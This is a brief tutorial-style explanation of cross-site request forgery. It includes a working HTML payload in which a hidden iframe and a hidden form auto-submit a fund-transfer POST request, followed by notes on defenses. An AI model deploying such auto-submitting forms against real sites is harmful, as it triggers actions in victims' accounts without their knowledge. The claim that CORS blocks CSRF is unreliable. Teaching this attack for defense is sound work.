# CSRF Attacks

Cross Site Request Forgery attacks make use of credentials saved in your current browing session that were not protected from being read by a malicious website. The example below would allow submitting an action entirely without a user's input or awareness on the web page because all the elements are hidden and the form is submitted automatically.

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='http://pokemon.com/transfer.php' target="csrf-frame" id\
="csrf-form">
<input type='hidden' name='from' value='Ash'>
<input type='hidden' name='to' value='Brock'>
<input type='hidden' name='amount' value='156'>
<input type='submit' value='submit'>
</form>
<script>document.getElementById("csrf-form").submit()</script>
```

Sites can attempt to defend against CSRF with a valid CSRF Token that must be included in the request. CORS Cross Origin Resource Sharing is a browser dependent security feature that restricts requests made to specific domain unless allowed. Validating Origin request headers are another way to filter out bad requests. 